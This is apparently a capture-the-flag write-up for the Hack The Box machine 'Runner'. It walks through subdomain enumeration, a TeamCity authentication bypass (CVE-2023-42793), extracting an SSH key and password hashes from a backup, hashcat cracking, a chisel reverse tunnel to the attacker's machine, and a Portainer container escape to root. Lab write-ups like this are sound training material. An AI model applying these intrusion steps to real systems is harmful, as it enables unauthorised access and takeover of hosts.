---
date: 2025-03-10
categories: [CTF, HTB]
title: "HTB - Runner"
tags: ['docker breakout', 'gobuster', 'hashcat', 'john the ripper', 'nmap', 'privilege escalation', 'python', 'rce']

description: "Runner - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Runner

NMAP

![image1](../resources/db64cfd7060742f5a7f99337ca6c28ad.png)
 
Add runner.htb to /etc/hosts

**<u>Subdomain enum</u>**
```bash
gobuster vhost -u http://runner.htb -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -t 64 --append-domain
```

![image2](../resources/dc4bd259b7c04114904e4be0c5d6afb1.png)

Add teamcity.runner.htb to /etc/hosts

We get a login page

![image3](../resources/022a3d85a6464e478ad23deb5adfebc4.png)

- There is an auth bypass exploit for this version of TeamCity (v.2023.05.3):
<https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis?referrer=etrblog#:~:text=/RPC2.-,Exploitation,-To%20leverage%20the>

- This github has a python script to exploit this automatically:
<https://github.com/H454NSec/CVE-2023-42793>


![image4](../resources/03344a5b772d416986bbde0855748ac8.png)


![image5](../resources/4bc1532288334ce5ae8225bf23f7fc96.png)

- Login to teamcity with the credentials:

![image6](../resources/d6c59b1915c84aee9d010000ab368c83.png)


![image7](../resources/7392b03380104b0a80347948b34443f3.png)

- We have a backup tab in the admin console
- Click start backup, and then click the link to download the zip file:

![image8](../resources/abb142acf59440f68016472023e2e0cf.png)

- If we do **tree** on the extracted zip, we can see a private ssh key:

![image9](../resources/231d1ff6067d4b4885b900d4c68cedac.png)

or using find and searching for key words:


![image10](../resources/afddb230305d4ad5937ec3b508cbdc06.png)

```bash
chmod 600 id_rsa

```
- Find the username:
```bash
grep -rnwi . -e "username"

```

![image11](../resources/158fd574c1d04634b3524cf3ef4d969a.png)

```bash
ssh -i id_rsa john@10.129.78.6

```

![image12](../resources/bbc52bd33365498cb8344df78003c160.png)

```bash
cat user.txt

```
- We also have a database dump in the backup file:

![image13](../resources/da9d717a54594475a708d47350651517.png)

- Here we have a users file with hashes:

![image14](../resources/4e1ed7c775904590995a00f1e5da1404.png)

- We can crack the hash for Matthew:

```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

```

![image15](../resources/2abafd846adc47ea8cf0f53c2fc7da5c.png)

**Matthew : piper123**

- Upload LinPEAS
From Linpeas we can see docker being used and portainer is running, as well as port 9000 is open (which is normally used by docker)

- Upload chisel and run:
```bash
./chisel client 10.10.14.29:8888 R:socks &

```
- Browse to 127.0.0.1:9000

![image16](../resources/41823f19e05e49c48217de69ac53e0f1.png)

- Log in with the matthew credentials

- We have some images available:

![image17](../resources/09ac30cf8b044d0f89cff0b61956208c.png)

- First thing is to create a volume - with the following volume options:

![image18](../resources/3c443b176d6642f2987ef56e488b4dd0.png)

To add volume options - Click on add driver option


![image19](../resources/56cc3a8594884af8bf91be83579d97fa.png)

- Now we can create a container to map the volume to:
Click on:


![image20](../resources/51037eadada94d109e01f77dbcb2d2e2.png)

Find any of the available images and put the name in:


![image21](../resources/5724674567ca4f9aabc37adf95fad26b.png)

Command and Logging - Interactive:


![image22](../resources/51b34e39ce0d46feb7984a54f3a960b5.png)

And in Volumes:


![image23](../resources/a2fb79f1bc6349f29dad0295096f0d53.png)

- Now deploy container

- We can now click out and back in to the container we made, and console in:

![image24](../resources/2755b95783ba4426806df6ba4ae5ce45.png)

- Now we can console into it and look in /mnt/root/root:

![image25](../resources/7182ec97d0cd490c95254ce030bca17c.png)